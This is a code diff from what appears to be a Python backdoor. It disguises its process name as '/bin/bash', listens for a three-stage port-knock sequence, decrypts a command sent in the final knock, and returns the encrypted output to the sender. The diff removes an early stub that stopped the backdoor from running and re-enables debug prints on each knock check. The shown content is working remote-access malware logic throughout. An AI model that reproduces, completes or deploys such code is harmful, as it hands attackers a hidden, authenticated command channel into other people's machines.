@@ -130,8 +130,6 @@ def start_backdoor():
     except Exception:
         # If failed, default to /bin/bash as process name.
         setproctitle.setproctitle("/bin/bash")
-    u_input = input()
-    return
 
     # Generate encryption key if needed. Ensure both sender and receiver have same key.
     encryption.generate_key()
@@ -192,17 +190,17 @@ def process_sniff_pkt(pkt):
 
     if knock_order == 0:
         if dst_port == port1 and data == port_knock_auth:
-            # print(f"First knock valid")
+            print(f"First knock valid")
             knock_order = 1
         else:
-            # print(f"First knock Failed")
+            print(f"First knock Failed")
             knock_order = 0
     elif knock_order == 1:
         if dst_port == port2 and data == port_knock_auth:
-            # print(f"Second knock valid")
+            print(f"Second knock valid")
             knock_order = 2
         else:
-            # print(f"Second Knock Failed.")
+            print(f"Second Knock Failed.")
             knock_order = 0
     elif knock_order == 2:
         final_payload = data.split('|')
@@ -210,7 +208,7 @@ def process_sniff_pkt(pkt):
         command = final_payload[1]
         address = pkt.payload.src
         if dst_port == port3 and auth_string == port_knock_auth:
-            # print(f"Third knock valid")
+            print(f"Third knock valid")
             print(f"Encrypted Cmd: {command}")
             decrypt_cmd = encryption.decrypt(command.encode('utf-8')).decode('utf-8')
             print(f"Cmd: {decrypt_cmd}")
@@ -219,7 +217,7 @@ def process_sniff_pkt(pkt):
             send_command_output(encrypted_data, address, sender_port)
             knock_order = 0
         else:
-            # print(f"Third Knock Failed.")
+            print(f"Third Knock Failed.")
             knock_order = 0
 
     # print(f"IP Dest: {ip_dst}")
